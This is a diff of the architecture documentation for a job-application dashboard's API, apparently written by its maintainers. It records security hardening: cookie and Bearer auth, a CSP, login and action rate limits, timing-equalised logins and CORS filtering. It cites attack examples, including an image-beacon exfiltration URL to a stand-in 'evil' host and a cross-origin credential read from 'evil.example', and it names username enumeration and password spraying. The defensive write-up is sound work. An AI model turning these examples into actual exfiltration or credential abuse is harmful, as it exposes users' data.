@@ -15,8 +15,20 @@ Docs: `http://127.0.0.1:8000/docs` · Tests: `venv\Scripts\python.exe -m pytest 
 
 ```
 api/
-  app.py            thin factory: CORS → include_router ×9 → static UI mount (LAST)
+  app.py            thin factory: CORS → _GateMiddleware → include_router ×13
+                    (11 gated + `auth`/`liveness` open) → static UI mount (LAST)
   deps.py           cors_origins() + require_token() (Bearer <API_TOKEN> when set)
+                    + resolve_actor() / require_actor() / require_submit_actor()
+                    (Scenario A attribution — see §4)
+  errors.py         failure()/missing(): traceback to the log, incident id to
+                    the caller, never exception text in a response
+  auth.py           Argon2id users, server-side sessions, roles, login-event
+                    audit, in SQLite. db_path() resolves the env on EVERY call
+  ratelimit.py      sliding-window login limiter (per-IP + per-username budgets)
+  activity.py       merged actor-attributed audit feed
+  apply_state.py    apply artifacts/claims/intents persistence. DB_PATH resolves
+                    ONCE at import — unlike auth.db_path() — so tests must patch
+                    the attribute (see tests/conftest.py)
   cache.py          sheet reads, TTL cache, curated enrichment, snapshot fallback,
                     CV profile cache + variant discovery
   schemas.py        JobOut, TrackerEntry, TrackerUpdate, HealthOut (+ VALID_TRACKER_STATUSES),
@@ -25,6 +37,10 @@ api/
   materials.py      resume/cover-letter generation registry (fp-mapped files only)
   runs.py           background scrape-run registry (single active run)
   routers/
+    auth.py         POST /api/auth/login, POST /api/auth/logout, GET /api/auth/me
+                    (OPEN — the login page has to work before a session exists)
+    liveness.py     GET /api/health/live (OPEN, exactly {"status":"ok"}, hidden
+                    from the schema; for container/orchestrator probes)
     health.py       GET /api/health
     jobs.py         GET /api/jobs, GET /api/jobs/{job_fingerprint}
     stats.py        GET /api/stats
@@ -37,11 +53,15 @@ api/
     cv.py           GET /api/cv/profile (cached parse, 501 when uncached),
                     PUT /api/cv/profile (Studio edits → on-disk cache, 501 when uncached),
                     GET /api/cv/variants (CVLibrary discovery w/ cvs/ fallback; missing dir → [])
+    activity.py     GET /api/activity (merged audit feed; login events admin-only)
     apply.py        POST /api/apply/{fp} creates a local review package only
             (service: api/apply.py, gate: api/safety.py; no ATS browser or submit)
 ```
 
 To debug: comment out one `include_router` line in `app.py` to isolate a group.
+Routers are split into `_GATED_ROUTERS` (auth attached at the router level) and
+`_OPEN_ROUTERS` (`auth`, `liveness`); add new routers to the gated tuple, since
+per-route `Depends` alone fails **open** if one is forgotten.
 
 ## 2. Endpoints
 
@@ -233,35 +253,238 @@ no submit path by design.
 - **Schemas:** `""` → `null`; numeric strings → float; bool-ish strings → bool
   (`computed/done` count as true) — Sheets stores everything as strings.
 
-## 4. Auth & CORS (`deps.py`, `app.py`)
+## 4. Auth & CORS (`deps.py`, `app.py`, `auth.py`, `ratelimit.py`)
 
-- `API_TOKEN` empty → open (local-dev default). Set → exact-match Bearer required
-  on **every** `/api/*`, reads included.
-- Non-local bind refuses at import time inside `create_app()` (covers the
-  documented `uvicorn api.app:app` path, not just `python api/app.py`).
+- **Three accepted credentials, checked in this order** (single predicate:
+  `deps.credentials_ok`, shared by every gate so they cannot drift apart):
+  1. valid `rja_session` HttpOnly cookie → allow;
+  2. `Authorization: Bearer <API_TOKEN>` exact match → allow (a *wrong* Bearer
+     is a 401, never a fallthrough);
+  3. `open_access()` — `API_TOKEN` unset **and** zero users → allow.
+  A DB read failure counts as "users may exist", so step 3 **fails closed**.
+- `open_access()` is a fresh-clone localhost convenience only, and it is
+  announced with a `warnings.warn` at every startup. It is *not* the same as
+  "`API_TOKEN` empty → open": once `create_user.py` has run, an empty
+  `API_TOKEN` means every `/api/*` route returns 401.
+- Non-local bind refuses at import time inside `create_app()`, checked against
+  **both** `API_HOST` and uvicorn's own `--host` flag. Reading only the env var
+  let the documented `uvicorn api.app:app --host 0.0.0.0` bind publicly with
+  `API_HOST` unset — which, combined with `open_access()`, meant a fully
+  public API.
+- **Auth is attached at the router level** (`_include_gated` →
+  `include_router(dependencies=[Depends(require_token)])`) *and* per route.
+  Per-route alone fails OPEN: one forgotten `Depends` on a new endpoint ships
+  it public. Router-level makes the safe behaviour the default. `auth.py` is
+  the only exempt router — `/api/auth/login` has to be reachable logged out.
+  This must be done via `include_router(dependencies=...)`, **not** by
+  appending to `router.dependencies`: this FastAPI version resolves included
+  routers lazily (`_IncludedRouter`) and post-construction mutation is a
+  silent no-op. `tests/test_api_auth_hardening.py` pins that trap.
+- `_GateMiddleware` covers the three things no router dependency can reach:
+  `/docs` + `/openapi.json` (FastAPI serves them itself — gated by default,
+  `API_DOCS_ENABLED=true` to publish) and `/index.html` (the `StaticFiles`
+  mount would otherwise hand out the dashboard shell past the `GET /`
+  redirect). It also sets `X-Content-Type-Options`, `X-Frame-Options` and
+  `Referrer-Policy` on every response, so a bare uvicorn deploy is not
+  silently unprotected without Caddy.
+- **Content-Security-Policy** (`app.py`, `_CSP_DIRECTIVES`): served on every
+  response, HTML included. The comment that used to sit here said a CSP was
+  deliberately not shipped because the dashboard relies on inline
+  `<script>`/`<style>` blocks — which treated "cannot be strict" as "cannot
+  exist" and gave up everything a CSP does that has nothing to do with inline
+  script. `script-src` is now `'self'` with **no** `'unsafe-inline'`, so an
+  injected inline payload cannot execute: that prevents the injection from
+  starting rather than only limiting what a successful one can do. It is
+  possible because the last inline script in the frontend — one IIFE at the end
+  of `login.html` — was extracted to `frontend/js/login.js`, verified by the e2e
+  suite (breaking that file fails "login flow — auth enforced", since jsdom runs
+  with `resources:'usable'` and really fetches external scripts).
+  `connect-src 'self'` blocks exfiltration, which is the entire point of an XSS;
+  `img-src 'self' data: blob:` blocks `<img src="//evil/?d=...">` beacons, which
+  need no script execution at all; `object-src 'none'`, `base-uri 'self'` (a
+  `<base href>` would rewrite every relative URL on the page, including every API
+  call), `form-action 'self'` and `frame-ancestors 'self'` close the rest.
+  `blob:` in `img-src` is not decoration: `autoApply.js` renders the review
+  screenshot through `URL.createObjectURL`. The remaining gap is
+  `style-src 'unsafe-inline'`, needed by 43 markup `style="..."` attributes; CSS
+  cannot execute and its one exfiltration channel (`background:url()`) is closed
+  by `img-src`. `CSP_MODE=report-only` sends the policy without enforcing it,
+  which is how to check it against a real browser before trusting it, and
+  `CSP_MODE=off` is an escape hatch rather than a recommendation. An
+  unrecognised mode enforces and warns — a typo must not remove the protection.
+  `tests/test_content_security_policy.py` re-derives every allowance from the
+  frontend, so the policy and the pages cannot drift apart silently.
+- **Login abuse resistance** (`ratelimit.py`): two sliding-window budgets —
+  per client IP (`LOGIN_RATE_LIMIT`, default 12) and per username
+  (`LOGIN_USER_RATE_LIMIT`, default 6) over `LOGIN_RATE_WINDOW` (default 600s)
+  — are checked **before any Argon2 work** and answer `429` + `Retry-After`.
+  Both are needed: per-IP alone lets one attacker lock out a NAT'd office,
+  per-username alone lets an attacker spray one password from rotating IPs. A
+  successful login clears the *username* budget only. The handler is
+  `async def` and awaits its failure penalty — the previous sync `def` +
+  `time.sleep(0.5)` held a threadpool worker per attempt, so ~40 concurrent
+  bad passwords saturated the 40-thread pool and stalled every other sync
+  route (measured 5.6s wall → 1.4s, with 34/40 answered 429 and no hashing).
+- **A missing username costs the same as a wrong password** (`auth.py`,
+  `_DECOY_PASSWORD_HASH`): `verify_login` used to return on `row is None`
+  without touching Argon2, so an existing username cost one Argon2id verify
+  (~97-107 ms at m=65536,t=3,p=4) and a non-existent one cost none. Measured
+  over the real endpoint, 601-799 ms vs 507-508 ms — disjoint ranges, so a
+  handful of requests sorted any candidate list into real accounts and not. The
+  response body and the audit trail were already identical; wall-clock time was
+  the only remaining channel. The no-such-user path now verifies against a decoy
+  hash of a discarded random secret and throws the answer away, which puts both
+  paths at 500 ms of failure penalty plus one verify. Deliberately **not**
+  equalised: requests rejected on their own shape (empty or oversized password)
+  skip the verify, because that branch depends on what the caller sent rather
+  than on whether the account exists, and paying for a decoy verify there would
+  re-open the unbounded-Argon2 hole `PASSWORD_MAX_LENGTH` closes.
+- The limiters are **per-process**, which is exact under the deployed
+  `--workers 1`. Scaling out multiplies every budget by the worker count — move
+  them to a shared store first.
+- **Action budgets** (`ratelimit.py`, `ACTION_KINDS`): the login limiter guards
+  the only *unauthenticated* write. It guarded nothing else, so every
+  authenticated caller could loop the endpoints that cost real money or real CPU
+  with no ceiling at all — resume and cover-letter generation (an LLM call each),
+  the headless-browser apply/intent/submit runs, and `/api/scrape` (~47 boards)
+  plus `/api/jobs/refresh`. The audit confirmed `POST /api/scrape` returned
+  **202 for the operator role** and the scrape actually ran, so one leaked
+  operator session was an unbounded credit burn and an unbounded outbound
+  traffic source. Two budgets, because the two classes differ by an order of
+  magnitude in cost: `"action"` (per-job, `ACTION_RATE_LIMIT` default 60) and
+  `"run"` (whole-pipeline, `RUN_RATE_LIMIT` default 6), both over 600s.
+  Keyed on the **actor**, not the IP: keying on IP repeats the H1 mistake, where
+  the budget becomes launderable by rotating source addresses and every operator
+  behind one proxy shares a bucket. The actor is already resolved for
+  attribution, so this costs nothing. Wired via `api.deps.action_budget(kind)`
+  added *alongside* `require_token`, never replacing it — auth still runs first,
+  so an anonymous caller gets 401 and spends no budget. A request that then
+  fails (404, 400) **still spends** its unit, deliberately: the cost being
+  limited is the handling, and a caller who can make requests error cheaply
+  should not get unlimited ones.
+- `LoginRequest` bounds `username` (≤64) and `password` (≤128). The ceiling is
+  a resource control: `/api/auth/login` is unauthenticated, so an unbounded
+  field lets one small JSON body buy a full Argon2id verify on 200 KB of
+  input. `api.auth.verify_login` enforces the same bound for non-HTTP callers.
+- **A password reset revokes every session for that user** (`update_password`
+  deletes them in the same operation). Otherwise a stolen cookie survives the
+  rotation for the rest of its TTL — which defeats the purpose of resetting.
+- **Sessions have two ceilings, and both are enforced in `get_session`.**
+  `expires_at` is the absolute TTL (`SESSION_TTL_HOURS`, default 168): a session
+  dies that long after it was minted however actively it is used.
+  `last_seen_at` is the idle ceiling (`SESSION_IDLE_TIMEOUT_HOURS`, default 24,
+  clamped to the absolute TTL — an idle window longer than the TTL is
+  unreachable, so accepting it would mean accepting a knob that does nothing):
+  a session dies that long after its *last request*. The absolute TTL alone
+  meant a cookie copied from a laptop backup, a shared machine or a synced
+  browser profile stayed valid for the full seven days. The honest limit: an
+  attacker who *uses* a stolen cookie keeps sliding its own idle window, so this
+  closes steal-now-use-later and the absolute TTL is still what bounds active
+  theft. `last_seen_at` is nullable and rows written before it existed fall back
+  to `created_at` — treating NULL as "never seen" would sign everyone out on the
+  first request after the upgrade, and treating it as "seen now" would make
+  every pre-existing session immortal. The slide is throttled to one write per
+  session per `_SESSION_TOUCH_SECONDS` (60) because `get_session` runs on every
+  authenticated request and an unthrottled touch would turn every dashboard poll
+  into a write. `purge_expired_sessions` deletes on `COALESCE(last_seen_at,
+  created_at)` mirroring that fallback exactly, so idle-dead rows cannot
+  accumulate and push a LIVE session out through `MAX_SESSIONS_PER_USER`.
+- SQLite: schema DDL runs **once per (process, db path)**, not per request
+  (`require_token` reads the sessions table on every call, and rebuilding the
+  schema each time measured ~3.6 ms/request). `journal_mode=WAL` is set at
+  init so the per-request session read is not blocked by a concurrent
+  login/logout write.
 - CORS: localhost `:3000/:5173/:8000/:8080` by default, override via
   `API_CORS_ORIGINS`. `allow_methods = GET, POST, PUT, PATCH, OPTIONS`.
+  `allow_credentials=True` — auth is a cookie now, so a cross-origin dashboard
+  configured via `API_CORS_ORIGINS` cannot authenticate without it.
+  `cors_origins()` **filters** the override rather than passing it through:
+  `*`, the `null` origin, non-http(s) schemes, and anything carrying a path,
+  query or trailing slash are dropped with a `RuntimeWarning`, because
+  Starlette matches these strings verbatim against the Origin header and dead
+  entries look like they grant access. `*` is the important one — this text used
+  to say `cors_origins()` "always returns an explicit list, never `*`" while
+  nothing enforced it, and with `allow_credentials=True` Starlette *reflects*
+  the caller's origin for a wildcard rather than rejecting it. Verified live:
+  `Origin: https://evil.example` was echoed with
+  `Access-Control-Allow-Credentials: true` and read `/api/jobs` using the
+  operator's cookie. If every entry is rejected the localhost defaults apply,
+  which is stricter than what was asked for and so fails safe.
 - Static UI mount is **last** so `/api/*` and `/docs` always win.
 
 ### Session vs Token Precedence (Scenario A — Multi-Operator Attribution)
+
+**Implemented** in `api/deps.py`: `resolve_actor()` (pure resolution),
+`require_actor()` (401 if nothing resolves) and `require_submit_actor()`
+(attribution **plus** the admin gate for `/submit`).
 
 **Rule (explicit, not accidental):**
 
 | Credential Present | Actor Recorded |
 |---|---|
 | Valid session cookie only | `username` (from `session_user(request)`) |
-| Valid `APPLY_API_TOKEN` Bearer only | `"automation"` (fixed sentinel) |
-| **Both** valid session **and** valid `APPLY_API_TOKEN` | **Session wins** → `username` |
+| Valid `APPLY_API_TOKEN` **or** `API_TOKEN` Bearer only | `"automation"` (fixed sentinel, `AUTOMATION_ACTOR`) |
+| **Both** valid session **and** a valid Bearer token | **Session wins** → `username` |
+| No credentials, but auth is not enforced at all (`open_access()` — fresh clone: no users, no `API_TOKEN`) | `"local-dev"` (`OPEN_ACCESS_ACTOR`), checked **last** |
+| No credentials and auth **is** enforced | `""` → `require_actor` raises **401** |
 
-This precedence is **intentional**: a human operator logged into the dashboard should always be attributed by their username, even if an automation token is also present in the request (e.g., from a reverse proxy or test harness). The session check runs first in `apply_access_ok()` and `require_apply_token()`.
+This precedence is **intentional**: a human operator logged into the dashboard is
+always attributed by username, even if an automation token is also present in the
+request (a reverse proxy that injects the service token, or a test harness).
+Recording `"automation"` there would blame the machine for a human's decision.
 
-**Implementation:** `api.deps.require_actor(request, creds) -> str` returns the attributed actor string for use in write paths. Never returns empty/`None` — fails closed (401) if no identifiable actor.
+Two ordering rules that are easy to get wrong, both tested:
+
+- `OPEN_ACCESS_ACTOR` is resolved **last**. `require_token` admits a fresh clone
+  with no users configured, so failing closed on attribution would break every
+  write on a first-run install — but the sentinel must never mask a real
+  identity, so an authenticated username always wins.
+- `"local-dev"` is deliberately **distinct** from `"automation"`. A row reading
+  `local-dev` means "written while auth was off", not "written by a service
+  token", and the difference is the whole point of an audit trail.
+
+Note that `resolve_actor` accepts either Bearer secret **for attribution only**.
+Authorization on the apply routes is unchanged and stricter — see below.
+
+**Where the actor is written:** `actor TEXT` on `apply_claims`, `apply_intents`
+and `apply_review_artifacts`, and `created_by` (column 13) on the Sheets APPLIED
+tab. All three SQLite tables are upgraded **in place** with
+`_add_column_if_missing` (`PRAGMA table_info` → conditional `ALTER`), because
+SQLite has no `ADD COLUMN IF NOT EXISTS` and existing deployments hold real apply
+history that must not be recreated. The Sheets column is **best-effort**: if the
+header cannot be secured, attribution is dropped rather than the application row.
+HTTP routes always pass the actor explicitly; only the CLI/scheduler rely on the
+`AUTOMATION_ACTOR` service-layer default.
+
+**Roles:** users carry `role` = `admin` or `operator` (`create_user.py --role`).
+`require_submit_actor` enforces: if a session is present it **must** be admin —
+the session wins for authorization too, matching the attribution precedence; if
+there is no session, `APPLY_API_TOKEN` is accepted and attributed `"automation"`.
+A service Bearer has **no role** (it is not a person), so it can never satisfy an
+admin-only gate by itself. The first user created is admin and later users default
+to operator, so a bootstrapping mistake cannot lock the only operator out.
+
+**What attribution does *not* do:** it is forensics, not enforcement. The daily
+apply budget (`daily_apply_caps`) is keyed on `cap_date` alone — one **global**
+pool shared by every operator, with a second per-browser cap in `localStorage` —
+so per-operator caps remain impossible (Scenario B, `PM.md` §5). Sheets status
+changes are also unattributed: the APPLIED tab keeps no change history, so
+`created_by` records who *added* a row and nothing more.
+
+`GET /api/activity?limit=N` serves the merged, time-ordered feed. Its login
+events carry client IPs and are therefore **admin-only**, decided from the
+caller's role rather than a query parameter; `includes_login_events` in the
+response explains why sign-in history is absent for a non-admin.
 
 ### Apply-Gated Routes Auth (unchanged, documented for clarity)
 
 - `POST /api/apply/{fp}/intent` + `/submit` + tracker reconcile: **session OR `APPLY_API_TOKEN` only**
+- `/submit` additionally requires, when the caller uses a session, that the
+  session's role is `admin` (`require_submit_actor`)
 - General `API_TOKEN` **never accepted** on these routes
-- `SUBMIT_ENABLED=False` kill-switch still gates `/submit` (403) regardless of auth
+- `SUBMIT_ENABLED=False` kill-switch still gates `/submit` (403) regardless of
+  auth, and is evaluated **before** the actor dependency so the 403 ordering is
+  preserved
 
 ## 5. Testing
 
@@ -297,5 +520,13 @@ status codes, never hit live Sheets).
 1. Schema in `schemas.py` (nullable fields, `""→null` validators).
 2. Sheet/cache accessor in `cache.py` (lazy imports, never crash → `[]`/`None`).
 3. New file in `routers/` (or extend the matching group file) + `include_router`.
-4. Tests in `tests/test_api_<group>.py` following the Phase 1 fake pattern.
-5. Frontend fn in `js/api.js` + row in README endpoint table.
+4. **Errors**: a broad `except Exception` must `raise failure("<Action>", exc)`
+   from `api/errors.py` — never `detail=f"...: {e}"`. The traceback goes to the
+   server log under a short incident id and the caller gets the action name plus
+   that id, which is greppable in `docker compose logs api`. Messages you wrote
+   *for* the caller (`ValueError` from `cache.refresh`, the `DreamTierForbidden`
+   family) keep going out verbatim; making those opaque hides nothing and breaks
+   the dashboard. `tests/test_error_disclosure.py` walks every router's AST and
+   fails the build on a new leak.
+5. Tests in `tests/test_api_<group>.py` following the Phase 1 fake pattern.
+6. Frontend fn in `js/api.js` + row in README endpoint table.
